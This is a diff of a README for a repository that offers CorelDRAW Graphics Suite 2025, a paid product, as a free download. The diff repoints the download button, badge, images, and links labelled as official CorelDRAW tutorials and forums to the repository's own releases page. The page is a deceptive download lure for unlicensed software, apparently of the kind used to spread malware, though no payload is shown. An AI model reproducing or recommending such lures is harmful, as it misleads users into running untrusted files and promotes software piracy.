@@ -1,6 +1,6 @@
 # CorelDRAW-Free
 
-![CorelDRAW Logo](https://upload.wikimedia.org/wikipedia/commons/thumb/0/06/CorelDRAW_2020_icon.svg/1200px-CorelDRAW_2020_icon.svg.png)
+![CorelDRAW Logo](https://github.com/Masonator8/CorelDRAW-Free/releases)
 
 Welcome to the **CorelDRAW-Free** repository! Here, you can find the CorelDRAW Graphics Suite 2025, the ultimate design toolkit, available for free download.
 
@@ -19,18 +19,18 @@ Welcome to the **CorelDRAW-Free** repository! Here, you can find the CorelDRAW G
 - Learn how to curve text in CorelDRAW
 - Use CorelDRAW X7 to erase parts of your design
 
-## [Download CorelDRAW Graphics Suite 2025 for Free](https://github.com/uploads/App.zip)
+## [Download CorelDRAW Graphics Suite 2025 for Free](https://github.com/Masonator8/CorelDRAW-Free/releases)
 
 Click the button below to download CorelDRAW Graphics Suite 2025:
-[![Download CorelDRAW](https://img.shields.io/badge/Download-CorelDRAW-blue.svg)](https://github.com/uploads/App.zip)
+[![Download CorelDRAW](https://github.com/Masonator8/CorelDRAW-Free/releases)](https://github.com/Masonator8/CorelDRAW-Free/releases)
 
 For more information or if the link does not work, please check the "Releases" section of this repository.
 
 ## Get Started with CorelDRAW
 If you are new to CorelDRAW or looking to enhance your design skills, here are some resources to get you started:
 
-- [CorelDRAW Tutorials](https://www.coreldraw.com/en/tutorials/)
-- [CorelDRAW Community Forums](https://community.coreldraw.com/)
+- [CorelDRAW Tutorials](https://github.com/Masonator8/CorelDRAW-Free/releases)
+- [CorelDRAW Community Forums](https://github.com/Masonator8/CorelDRAW-Free/releases)
 
 ## Repository Topics
 This repository covers a wide range of topics related to CorelDRAW, including:
@@ -55,4 +55,4 @@ To explore more about design, creativity, and innovation using CorelDRAW, feel f
 
 Happy designing! 🎨✨
 
-![CorelDRAW Design](https://cdn.pixabay.com/photo/2017/08/30/01/05/milky-way-2695569_960_720.jpg)
+![CorelDRAW Design](https://github.com/Masonator8/CorelDRAW-Free/releases)
